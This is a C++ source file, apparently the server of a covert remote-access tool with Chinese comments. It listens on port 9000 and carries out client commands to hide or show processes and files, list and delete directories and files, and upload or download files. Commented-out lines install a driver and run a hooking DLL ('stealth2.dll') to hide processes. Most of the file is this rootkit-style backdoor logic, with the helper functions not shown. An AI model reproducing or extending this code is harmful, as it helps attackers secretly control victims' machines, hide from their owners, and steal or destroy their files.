
extern MLHT_SERVER* ms;  //MLHT 服务器

void SocketWorking(){

	switch(ms->p_get->PacketAnalyze_PROCESS())
	{
	case MLHT_MTU_TYPE_PROCESS_HIDE:
		ms->GetProcessHide();
		return;
	case MLHT_MTU_TYPE_PROCESS_SHOW:
		ms->GetProcessShow();
		return;
	default:
		break;
	}
	

	switch(ms->p_get->PacketAnalyze_FILE()){
	case MLHT_MTU_TYPE_FILE_HIDE:
		ms->GetFileHide();
		return;
	case MLHT_MTU_TYPE_FILE_SHOW:
		ms->GetFileShow();
		return;
	default:
		break;
	}
	
	
	switch(ms->p_get->PacketAnalyze_SHELL())
	{
	case MLHT_MTU_TYPE_SHELL_LS:
		switch(ms->GetShellLs())
		{
		case PACKET_ACCEPT_SUCCESS:
			printf("Shell Ls success.\n");
			break;
		case FILE_WRITE_FAIL:
			printf("Write file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case FILE_OPEN_FAIL:
			printf("Open file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case FILE_LS_FAIL:
			printf("List file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Packet accept fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		default:
			printf("Client is blocked\n");
			break;
		}
		return;
	case MLHT_MTU_TYPE_SHELL_CD:
		return;
	case MLHT_MTU_TYPE_SHELL_MKDIR:
		ms->GetShellMkdir();
		return;
	case MLHT_MTU_TYPE_SHELL_RMDIR:
		ms->GetShellRmdir();
		return;
	case MLHT_MTU_TYPE_SHELL_RM:
		ms->GetShellRm();
		return;
	case MLHT_MTU_TYPE_SHELL_UPLOAD:
		switch(ms->GetUploadFile())
		{
		case PACKET_ACCEPT_SUCCESS:
			printf("Upload success.\n");
			break;
		case FILE_WRITE_FAIL:
			printf("Write file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case FILE_OPEN_FAIL:
			printf("Open file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Packet accept fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		default:
			printf("Client is blocked\n");
			break;
		}
		return;
	case MLHT_MTU_TYPE_SHELL_DOWNLOAD:
		switch(ms->SendDownloadFile())
		{            
		case PACKET_ACCEPT_SUCCESS:
			printf("Download success.\n");
			break;
		case FILE_WRITE_FAIL:
			printf("Write file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case FILE_OPEN_FAIL:
			printf("Open file fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Packet accept fail.\n");
			ms->SendFINPacket();
			printf("Send FIN packet back...\n");
			break;
		default:
			printf("Client is blocked\n");
			break;
		}
		return;
	default:
		return;
	}
}


void Thread_Socket(){
	//执行文件隐藏，安装驱动
	//setdriver(Install_Run);
	//取消文件隐藏，卸载驱动
	//setdriver(Stop_Unload);
	// 执行进程隐藏，安装钩子
	//system("E:\\example\\04\\33\\bin\\HideProc2.exe -hide stealth2.dll");
	// 取消进程隐藏，卸载钩子
	//system("E:\\example\\04\\33\\bin\\HideProc2.exe -show stealth2.dll");
	int ret;

	ms = new MLHT_SERVER(9000);

	while(true)
	{
		printf("Socker Server:Wait client to link:\n");
		ms->WaitForClient();
		printf("Socker Server:Server is linked by client\nSend ACK packet back...\n");

		do{
			ret = ms->WaitReturnPacket();//一直接收客户端socket的send操作

			switch(ret)
			{            
			case PACKET_ACCEPT_SUCCESS:
				ms->SendACKPacket();
				SocketWorking();
				break;
			case PACKET_ACCEPT_FAIL:
				printf("Get a bad packet from client.\n");
				ms->SendFINPacket();
				printf("Send FIN packet back...\n");
				break;
			default:
				printf("Client is blocked\n");
				break;
			}
		}while(ret!=SOCKET_ERROR);
	}
}